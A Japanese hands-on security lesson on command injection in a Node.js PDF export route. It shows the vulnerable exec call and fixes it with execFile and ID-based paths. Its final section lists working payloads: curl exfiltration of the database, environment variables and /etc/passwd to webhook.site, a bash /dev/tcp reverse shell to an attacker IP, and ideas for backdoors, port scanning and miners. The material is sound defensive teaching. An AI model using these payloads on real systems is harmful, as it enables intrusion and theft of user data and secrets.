## 学ぶこと

コマンドインジェクションは、ユーザー入力を **OS のシェルに渡すコマンド** に埋め込んでしまったときに起きる脆弱性です。SQL インジェクションの「シェル版」と捉えると分かりやすく、成立すると **サーバー上で任意のコマンドを実行** されます。最悪の場合、サーバーの完全な乗っ取りに直結します。

PDF エクスポートのように **「外部のコマンドラインツールを呼び出す」** 機能は、現実のアプリでよく登場します（`wkhtmltopdf`, `ffmpeg`, `convert` など）。AI が生成するコードでも、こういう外部ツール呼び出しはほぼテンプレ化していて、無造作に書くと脆弱性が混入しがちです。

この章で身につけたい観点は次の3つです。

- **なぜ脆弱なのか**：シェルは `;` `&&` `|` `` ` `` `$()` などの **特別な文字** を解釈する。文字列で組み立てるとそれらが構造として機能してしまう
- **正しい直し方**：シェルを介さない API（`execFile` / `spawn` の引数配列）を使う。配列で渡せば各要素が **そのまま1つの引数** として扱われ、シェルの特殊文字が無効化される
- **多層防御**：API の選択だけでなく、**そもそもユーザー入力をファイル名やパスとして使わない設計** が望ましい。入力を構造から切り離せばインジェクションは成立しない


3. 本文は何でも良い。投稿する
4. 作成した記事を開き、「PDF でダウンロード」をクリック
5. アプリの起動方法に応じて、別ターミナルで `/tmp/PWNED` の有無を確認

   **Docker で起動している場合**（コンテナ内の `/tmp` を見る）

   ```sh
   docker compose exec app ls -la /tmp/PWNED
   ```

   **ホストマシンで `npm run dev` 直接起動している場合**（ホストの `/tmp` を見る）

   ```sh
   ls -la /tmp/PWNED
   ```

   どちらの場合も **ファイルが存在すれば攻撃成功** です。

`touch` の代わりに `cat /etc/passwd > /tmp/leak` のようなコマンドも実行できます。Docker コンテナ内で動かしている場合、被害は **コンテナ内** に閉じますが、それでも本来読まれてはならない情報（環境変数、認証情報、設定ファイル）にアクセスされる危険があります。**ホストマシンで直接起動している場合は、ホスト OS そのものに対するコード実行**になります（あなたのホームディレクトリの読み書き、SSH 鍵の窃取、別プロセスの操作など、被害が桁違いに大きい）。実運用ではアプリを非特権コンテナで動かす、`/tmp` を tmpfs にする、といった隔離が「最終防衛線」として機能します。

#### PWNED について

`PWNED`（発音は「ポウンド」）は、ハッカー文化のスラングで「**乗っ取られた / 完全にやられた**」を意味します。元々は英語の "owned"（支配された・負かされた）のタイポで、対戦ゲーマーが "I owned you" と打とうとして QWERTY 配列で `o` の隣の `p` を押してしまった結果 "pwned" となり、それが定着したと言われています。情報漏洩チェックサイト [Have I Been Pwned](https://haveibeenpwned.com/) も同じ語源です。

このレクチャーで `touch /tmp/PWNED` を実行するのは、**「攻撃者が任意のシェルコマンドを実行できる」ことを目に見える形で証明するためのマーカー** です。ファイル名自体は何でもよく（`/tmp/HACKED` でも動きます）、CTF やセキュリティ教材では慣例的に `PWNED` がよく使われます。実害のない `touch` で攻撃成立を示していますが、同じ場所に `rm -rf /` も `curl 攻撃者サーバ | sh` も書けたはずだ、ということは押さえておいてください。

### TODO 2: なぜ実行できてしまうのかを説明する

該当箇所は [app/routes/articles.js](./app/routes/articles.js) の PDF エクスポートハンドラです。

```js
const outputPath = join(tmpDir, `${article.title}.pdf`);
// ...
const command = `${WKHTMLTOPDF} "${inputPath}" "${outputPath}"`;
await execAsync(command);
```

タイトルが `レポート"; touch /tmp/PWNED; echo "` のとき、最終的なコマンド文字列は:

```sh
/path/bin/wkhtmltopdf "/tmp/article-N.html" "/tmp/レポート"; touch /tmp/PWNED; echo ".pdf"
```

シェルから見ると、これは **3つのコマンド** を `;` で繋いだスクリプトです。

1. `wkhtmltopdf "/tmp/article-N.html" "/tmp/レポート"` （途中までの正常系）
2. `touch /tmp/PWNED` （**注入された任意コマンド**）
3. `echo ".pdf"` （残骸）

`child_process.exec` は **内部で `/bin/sh -c` を起動** してコマンド文字列を解釈させるので、`;` `&&` `|` などの **シェル構文がフルに有効** です。これがコマンドインジェクションの本体です。

### TODO 3: `execFile` で修正する

`execFile` を使うと **シェルを介さず** にコマンドを直接起動できます。第2引数は **引数の配列** で、各要素はシェルの解釈を受けません。

```js
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// ...

await execFileAsync(WKHTMLTOPDF, [inputPath, outputPath]);
```

これで `outputPath` に何が入っていても、**`wkhtmltopdf` の第2引数** という1つの値として扱われます。`;` を入れても **ファイル名のリテラル** として解釈されるだけで、別コマンドにはなりません。

#### 「シェルを介す／介さない」を OS の目線で見る

「シェルを介さないとなぜ安全？」がイメージしづらいので、**OS から見える実際の実行内容** を `exec` / `execFile` で比べてみます。

例として、`outputPath` に `output.pdf; touch /tmp/PWNED` が入ってきたとします。

**`exec`（シェルあり）の場合**

```js
exec(`wkhtmltopdf ${inputPath} ${outputPath}`)
```

Node は内部で `/bin/sh -c` を起動し、組み立てた文字列をシェルに渡します。

```sh
/bin/sh -c "wkhtmltopdf input.html output.pdf; touch /tmp/PWNED"
```

シェルはこの文字列を **2つのコマンド** として解釈します。

1. `wkhtmltopdf input.html output.pdf`
2. `touch /tmp/PWNED`

`;` が **コマンド区切り** として機能してしまうので、攻撃が成立します。

**`execFile`（シェルなし）の場合**

```js
execFile("wkhtmltopdf", ["input.html", "output.pdf; touch /tmp/PWNED"])
```

Node はシェルを介さず、OS の `execve(2)` システムコールでプログラムを直接起動します。プログラムから見える `argv` は次の通り。

```text
argv[0]: wkhtmltopdf
argv[1]: input.html
argv[2]: output.pdf; touch /tmp/PWNED   ← まるごと1つの引数
```

`wkhtmltopdf` は `argv[2]` を **そのままファイル名として** 受け取ります。`;` は単なる文字列の一部にすぎず、コマンド区切りとして解釈する主体（シェル）がいません。

| 項目 | `exec` | `execFile` |
|---|---|---|
| 実行方法 | `/bin/sh -c` 経由 | プログラムを直接起動 |
| `;` の扱い | コマンド区切り | ただの文字 |
| 攻撃成立 | する | しない |

**「解釈されない」＝ その文字列をシェルが読むことがない**。これが `execFile` の本質です。

修正後にもう一度同じタイトルでエクスポートしてみてください。`/tmp/PWNED` は **作成されません**（`touch` は実行されない）。代わりに wkhtmltopdf が「変なファイル名で書こうとして失敗する」だけで終わります（例: `Error: Cannot open file "output.pdf; touch /tmp/PWNED"`）。

### TODO 4: そもそも入力をファイル名に使わない（根本対策）

`execFile` でシェルインジェクションは塞げました。ですが、**ユーザー入力をファイルパスに使うこと自体** にもリスクが残ります（パストラバーサル、ファイルシステムの予期せぬ場所への書き込み、など）。

より堅い設計は **「ユーザー入力をファイル名・コマンド引数に使わない」** こと。タイトルはあくまで「記事のメタ情報」であって、サーバー側の操作対象ではないはずです。

修正例:

```js
const inputPath = join(tmpDir, `article-${id}.html`);
const outputPath = join(tmpDir, `article-${id}.pdf`);  // ← タイトルではなく ID を使う

await execFileAsync(WKHTMLTOPDF, [inputPath, outputPath]);

const pdfBuffer = await readFile(outputPath);

// ダウンロード時のファイル名はレスポンスヘッダで指定（タイトルはここで使えばOK）
c.header('Content-Disposition', `attachment; filename="article-${id}.pdf"`);
return c.body(pdfBuffer);
```

サーバー内部のファイル名は **常に予測可能なサニタイズ済みパス** にして、ユーザー向けの表示は HTTP ヘッダで指定するのが鉄則です。

> **発展**: ダウンロードファイル名にタイトルを含めたい場合、`Content-Disposition` の RFC 5987 の filename* 形式や、タイトルをサニタイズした後の値を使うなどの工夫が必要です。それでも **ファイルシステム** ではなく **HTTP レスポンス** での扱いなのでリスクの種類が違います。

## 補足: なぜ `exec` ではなく `execFile`?

| 関数 | シェル | 引数 | 用途 |
|---|---|---|---|
| `exec(command)` | あり（`/bin/sh -c`） | コマンド全体を文字列で渡す | `ls -la \| grep foo` のようなパイプを使いたいとき |
| `execFile(file, [args])` | なし | プログラムと引数を分離 | プログラムを直接起動するだけのとき（推奨） |
| `spawn(file, [args])` | なし | 同上、ストリーミング | 大量出力やリアルタイム処理 |

**「ユーザー入力をシェルに渡す」必要は、ほぼ常にない** と思って良いです。シェル機能（パイプ・リダイレクト・変数展開）が要るなら、それは Node 側で組み立てるか、ライブラリで代替しましょう。

## 補足: そもそも外部コマンドを呼ばずに済むなら

外部コマンドそのものを呼ばずに済むなら、それが一番安全です。例えば:

- ファイル一覧 → `fs.readdir` / `fs.glob`
- 画像変換 → ImageMagick の代わりに `sharp`
- ZIP 圧縮 → `unzip` の代わりに Node の zip ライブラリ
- PDF 生成 → `wkhtmltopdf` の代わりに `puppeteer` や `pdfkit`

外部プロセス起動は最後の手段、と覚えておくと事故が減ります。**`execFile` で呼ぶ + 入力をコマンドの構造から切り離す + そもそも呼ばない方法を検討する**、という多段の防御で考えるのが定石です。

## 発展: 実際の攻撃者は何をするのか

`touch /tmp/PWNED` はあくまで「コマンドが実行できた証拠」であって、実害ではありません。攻撃者の実務は大きく3系統あります。本章のラボ環境（Docker）で全部試せるので、**「コマンドが1個実行できる」がどれくらい怖いか** を肌で確認しておくと、修正の優先度の感覚が身につきます。

> ⚠️ 以下のペイロードは **このラボの Docker コンテナ内** や **自分が用意した受信サーバ** に向けてのみ使ってください。外部の実サービスに対して許可なく実行すると、**複数の日本の法律に同時に抵触** します。具体的にどの法律のどの条文か、罰則の重さ、正規の脆弱性報告ルートについては [LEGAL.md](../../LEGAL.md) にまとめています。

### 1. 情報窃取（一番現実的）

このアプリのコンテナには SQLite の DB と環境変数があるので、それを抜き出すのが最大のリターンです。`webhook.site` で受信用の URL を1つ発行してから、タイトルに次のような文字列を仕込みます。

```text
# DB ファイルごと外部に送りつける
レポート"; curl -F "f=@/workspace/data/app.db" https://webhook.site/<your-id>; echo "

# 環境変数を全部送る（API キー、DB 認証情報、JWT シークレット等）
レポート"; curl https://webhook.site/<your-id> -d "$(env)"; echo "

# /etc/passwd や設定ファイル
レポート"; curl https://webhook.site/<your-id> -d "$(cat /etc/passwd)"; echo "
```

DB を抜けばユーザー全員のメール・パスワードハッシュ・セッションが手に入ります。「`touch` できた」と「ユーザー全員のアカウント情報が抜けた」では危機感のレベルが全く違うので、ここまで一度は体験しておきましょう。

受信側のホストには `webhook.site` の他に次のようなツールも使えます。

- **[webhook.site](https://webhook.site/)** - URL を1つ発行するだけで、その URL に送られてきた HTTP リクエスト（ヘッダ・ボディ・添付ファイル）をブラウザで一覧できる無料サービス。アカウント不要で、研修用途に一番手軽
- **[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)** - Burp Suite Professional 付属の OAST（Out-of-Band Application Security Testing）サーバー。HTTP だけでなく **DNS / SMTP のクエリも記録** できるので、「外向き HTTP は塞がれているが DNS は通る」ような環境での情報抜き取り（DNS exfil）に使われます。プロのペネトレーションテスターの定番ツール
- **[ngrok](https://ngrok.com/)** - 自分のローカルマシンで動かしているサーバ（例: `nc -lvnp 4444` や簡易 HTTP サーバ）に、外部から到達できる一時的な公開 URL を発行してくれるトンネリングサービス。**リバースシェルの受け口** や **自分で書いた受信スクリプトを使いたいとき** に便利

### 2. リバースシェル（コンテナを「乗っ取る」）

「1コマンド実行できる」を「対話シェルがある」に昇格させる古典手口です。攻撃者側ホストで `nc -lvnp 4444` してから：

```text
レポート"; bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' &
```

`&` でバックグラウンドにするのがポイントで、HTTP リクエストの寿命と切り離します。これが繋がるとあとは `ls`, `cat`, `find / -name "*.env"` などインタラクティブにコンテナ内を探検できます。

### 3. 永続化・横展開

一度の RCE で終わらせず、次のアクセスでも実行されるよう仕込んだり、内部ネットワークに踏み込む手口です。

- **アプリのソースにバックドアを書き込む**（`echo '...' >> /workspace/app/routes/auth.js`） → 次回ログイン時に発火
- **内部ネットワークの他コンテナへスキャン**（`nc -zv db 1-10000`）
- **暗号通貨マイナーを `curl | sh` で投入**（クラウドの請求書攻撃）

### まとめ

`exec` にユーザー入力を渡すコードが1箇所あるだけで、**DB 全部抜き取り → サーバーの対話シェル取得 → ソースコード改ざんで永続化** までが現実的に1日で繋がります。「`touch` できた」で止めず、上記のうち少なくとも「DB を webhook に送る」までは実際にやっておくと、`execFile` への書き換えが「面倒な書き換え」ではなく「ライフラインの修復」に見えてきます。

そして同じ視点を **逆向き** にも使ってください。攻撃者にとって「1日で DB を抜けるルート」は、自分が許可なく踏めば **不正アクセス禁止法 + ウイルス罪 + 業務妨害罪 + 個人情報保護法** が同時に成立するルートでもあります（詳細は [LEGAL.md](../../LEGAL.md)）。技術的に可能なことと、法的にやっていいことは別です。**ラボでは思いっきり試して、実環境では絶対にやらない** という線引きを明確に持っておきましょう。
